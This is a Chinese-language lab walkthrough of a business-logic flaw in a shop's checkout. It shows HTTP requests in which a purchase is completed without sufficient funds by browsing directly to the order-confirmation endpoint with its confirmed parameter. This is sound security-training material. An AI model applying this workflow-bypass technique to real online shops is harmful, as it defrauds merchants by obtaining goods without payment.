# 实验：工作流验证不足

本实验对购买工作流中的事件序列做出了有缺陷的假设。为了解决本实验，请利用此缺陷购买一件 "Lightweight l33t leather jacket"（轻量级 l33t 皮夹克）。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

进行常规购物流程
- 加入购物车
    ```http
    POST /cart HTTP/2
    Cookie: session=jDefBYfKhWsUjmeFTRDr2xCNJSHrMSWq

    productId=3&redir=PRODUCT&quantity=1
    ```

- 提交订单
    ```http
    POST /cart/checkout HTTP/2
    Cookie: session=jDefBYfKhWsUjmeFTRDr2xCNJSHrMSWq

    csrf=Lu8pVwg1zaRQtct42oJWb0G5SDb7NQBb
    ```
    - 服务器响应
        ```http
        HTTP/2 303 See Other
        Location: /cart/order-confirmation?order-confirmed=true
        X-Frame-Options: SAMEORIGIN
        Content-Length: 0
        ```
        - 重定向到订单确认端点，并拥有确认参数
            - 若提交订单后强制导航到拥有确认参数的订单确认端点将如何？

- 访问端点
    ```
    GET /cart/order-confirmation?order-confirmed=true HTTP/2
    Cookie: session=jDefBYfKhWsUjmeFTRDr2xCNJSHrMSWq
    ```
    - 响应账单页面

进行余额不足的购物流程
- 提交订单
    - 服务器重定向
        ```http
        HTTP/2 303 See Other
        Location: /cart?err=INSUFFICIENT_FUNDS
        X-Frame-Options: SAMEORIGIN
        Content-Length: 0
        ```
        - 重定向到购物车端点，并拥有错误参数
            - 若并不使用错误参数访问购物车端点，而是强制导航到订单确认端点将如何？
            - 或访问购物车端点后再强制导航将如何？

尝试强制导航到订单确认页面
- 在使用错误参数访问购物车端点后，强制导航到订单确认端点
- 成功购买，且余额不变
